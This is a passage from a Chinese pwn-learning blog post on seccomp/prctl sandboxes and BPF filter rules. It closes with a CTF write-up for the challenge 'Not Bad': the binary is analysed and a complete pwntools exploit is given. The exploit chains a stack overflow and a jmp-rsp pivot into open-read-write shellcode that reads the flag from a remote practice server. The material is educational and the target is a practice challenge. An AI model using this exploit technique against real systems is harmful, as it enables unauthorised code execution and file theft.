+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/CTest/seccomp$ seccomp-tools dump ./prctl</span><br><span class="line">hey there!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00050001  return ERRNO(1)</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>
+<p>​		禁用掉之后，我们通过 seccomp 来 dump 一下。我们看到，最前面的就是 sock_filter 结构体的四个参数，后面的，就是 bpf 规则的汇编表示。</p>
+<h2 id="4-orw"><a class="markdownIt-Anchor" href="#4-orw">#</a> 4、orw：</h2>
+<h3 id="极客大挑战-2019not-bad"><a class="markdownIt-Anchor" href="#极客大挑战-2019not-bad">#</a> [极客大挑战 2019] Not Bad：</h3>
+<p>​		先检查下保护：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/Temp/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>​		没有开保护，且存在 RWX 段，IDA 看看：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		函数名等等有问题，试着恢复下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp();</span><br><span class="line">  init_0();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		简单恢复了下之后是这样，先看看 seccomp 函数，里面很明显存在沙盒（可能是种不专业的说法）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">60LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		好，那么直接用 seccomp-tools 工具 dump 一下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+<p>​		最后发现可以利用的系统调用有 orw 三个，那么看看 vuln 函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		这里存在栈溢出，感觉可以打 shellcode，但是，明显发现栈的长度不够 ret2shellcode，推测一手栈迁移，试试看。</p>
+<p>​		经过动调之后，发现在执行到函数 mmap 之后，存在一个可写可执行权限的内存段（扔一个小知识点：这里 mmap 参数类型是（起始地址，大小，保护类，文件描述符] 等））：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">          0x123000           0x124000 -wxp     1000      0 [anon_00123]</span><br></pre></td></tr></table></figure>
+<p>​		可以将栈迁移到这儿去，再执行 shellcode 或者 syscall 读文件，不过，这个要之后再说了。大概思路说下吧，先通过 shellcode 调用 read 函数将读文件写入内存然后输出这样的一个顺序，先贴一下 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line">Locale = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> Locale == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(&quot;./pwn&quot;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    mnap = <span class="number">0x123000</span></span><br><span class="line">    jmp_rsp = <span class="number">0x0400a01</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Easy shellcode, have fun!\n&quot;</span>)</span><br><span class="line">    shellcode = asm(shellcraft.read(<span class="number">0</span>,mnap,<span class="number">0x100</span>))</span><br><span class="line">    shellcode += asm(<span class="string">&#x27;mov rax,0x123000;call rax&#x27;</span>)</span><br><span class="line">    payload = shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)		<span class="comment">#这里的减0x30我没怎么看懂，记录在这儿</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    payload2 = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="number">3</span>,mnap+<span class="number">0x100</span>,<span class="number">0x100</span>)+shellcraft.write(<span class="number">1</span>,mnap+<span class="number">0x100</span>,<span class="number">0x100</span>))</span><br><span class="line">    io.send(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>​</p>
+<h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章：</h1>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyODM5MTcxLmh0bWw=">从 prctl 函数开始学习沙箱规则</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21yaGVzb25nemUvYXJ0aWNsZS9kZXRhaWxzLzEwMzAwODkyNQ==">BPF 详解</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x2eHU2NjYvYXJ0aWNsZS9kZXRhaWxzLzEzMDgyMTMzMA==">函数 prctl 系统调用</span></p>
+
+      <div class="tags">
+          <a href="/tags/Pwn/" rel="tag"><i class="ic i-tag"></i> Pwn</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2024-08-06 04:13:34" itemprop="dateModified" datetime="2024-08-06T04:13:34+08:00">2024-08-06</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="g01den 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="g01den 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://blog.g01den.top/posts/9d5b1ce4.html" title="pwn学习笔记（8）-初识沙箱">http://blog.g01den.top/posts/9d5b1ce4.html</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/posts/ff5b88d5.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture308.jpg" title="python原型链污染">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Web狗的自我安慰</span>
+  <h3>python原型链污染</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/posts/c8624158.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture310.jpg" title="pwn学习笔记（9）-中级ROP--ret2csu">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Pwn手的自我修养</span>
+  <h3>pwn学习笔记（9）-中级ROP--ret2csu</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E8%AF%86pwn%E6%B2%99%E7%AE%B1"><span class="toc-number">1.</span> <span class="toc-text"> 初识 Pwn 沙箱</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-prctl%E5%87%BD%E6%95%B0%E5%88%9D%E6%8E%A2"><span class="toc-number">1.1.</span> <span class="toc-text"> 1、prctl 函数初探</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-prctl%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text"> 2、prctl () 函数详解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-bpf%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99%E4%BC%AF%E5%85%8B%E5%88%A9%E5%B0%81%E8%A3%85%E5%8C%85%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text"> 3、BPF 过滤规则 (伯克利封装包过滤)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-orw"><span class="toc-number">1.4.</span> <span class="toc-text"> 4、orw：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019not-bad"><span class="toc-number">1.4.1.</span> <span class="toc-text"> [极客大挑战 2019] Not Bad：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">2.</span> <span class="toc-text"> 参考文章：</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/posts/c06afb6e.html" rel="bookmark" title="Pwn学习笔记（1）--前置知识">Pwn学习笔记（1）--前置知识</a></li><li><a href="/posts/c3c1bd42.html" rel="bookmark" title="Pwn学习笔记（2）--ret_2_text_or_shellcode">Pwn学习笔记（2）--ret_2_text_or_shellcode</a></li><li><a href="/posts/e20e7502.html" rel="bookmark" title="pwn学习笔记（3）ret2syscall">pwn学习笔记（3）ret2syscall</a></li><li><a href="/posts/52965aaa.html" rel="bookmark" title="pwn学习笔记（4）ret2libc">pwn学习笔记（4）ret2libc</a></li><li><a href="/posts/a698ff8.html" rel="bookmark" title="pwn学习笔记（5）--格式化字符串漏洞（未完全完成）">pwn学习笔记（5）--格式化字符串漏洞（未完全完成）</a></li><li><a href="/posts/cbafa55d.html" rel="bookmark" title="pwn学习笔记（6）--堆基础概述">pwn学习笔记（6）--堆基础概述</a></li><li><a href="/posts/efb4c08.html" rel="bookmark" title="pwn学习笔记（7）--堆相关源码">pwn学习笔记（7）--堆相关源码</a></li><li><a href="/posts/d7e2e20f.html" rel="bookmark" title="pwn学习笔记（0）-事后补充">pwn学习笔记（0）-事后补充</a></li><li><a href="/posts/9b0d93f7.html" rel="bookmark" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></li><li><a href="/posts/2c0210e1.html" rel="bookmark" title="how2heap_zh">how2heap_zh</a></li><li class="active"><a href="/posts/9d5b1ce4.html" rel="bookmark" title="pwn学习笔记（8）-初识沙箱">pwn学习笔记（8）-初识沙箱</a></li><li><a href="/posts/c8624158.html" rel="bookmark" title="pwn学习笔记（9）-中级ROP--ret2csu">pwn学习笔记（9）-中级ROP--ret2csu</a></li><li><a href="/posts/540e5c20.html" rel="bookmark" title="Pwn学习笔记（10）--UAF">Pwn学习笔记（10）--UAF</a></li><li><a href="/posts/f1497b96.html" rel="bookmark" title="pwn学习笔记（11）--off_by_one">pwn学习笔记（11）--off_by_one</a></li><li><a href="/posts/d1a08bca.html" rel="bookmark" title="pwn学习笔记（12）--Chunk Extend and Overlapping">pwn学习笔记（12）--Chunk Extend and Overlapping</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="g01den"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">g01den</p>
+  <div class="description" itemprop="description">golden的部落阁</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">49</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">10</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/posts/ff5b88d5.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/posts/c8624158.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/posts/4a17b156.html" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/fe4eec6d.html" title="【2024】高校网络安全管理运维赛">【2024】高校网络安全管理运维赛</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/955175a5.html" title="【2024】H&amp;NCTF">【2024】H&NCTF</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/c8624158.html" title="pwn学习笔记（9）-中级ROP--ret2csu">pwn学习笔记（9）-中级ROP--ret2csu</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+</div>
+
+    <span><a href="/posts/7232a36b.html" title="小小的总结（日常发癫）">小小的总结（日常发癫）</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/ad175165.html" title="ctfshow-文件包含">ctfshow-文件包含</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/4fb535d6.html" title="ctfshow-反序列化">ctfshow-反序列化</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+</div>
+
+    <span><a href="/posts/e3418ca3.html" title="随机二次元图api相关">随机二次元图api相关</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/9d5b1ce4.html" title="pwn学习笔记（8）-初识沙箱">pwn学习笔记（8）-初识沙箱</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/f1497b96.html" title="pwn学习笔记（11）--off_by_one">pwn学习笔记（11）--off_by_one</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'posts/9d5b1ce4.html',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
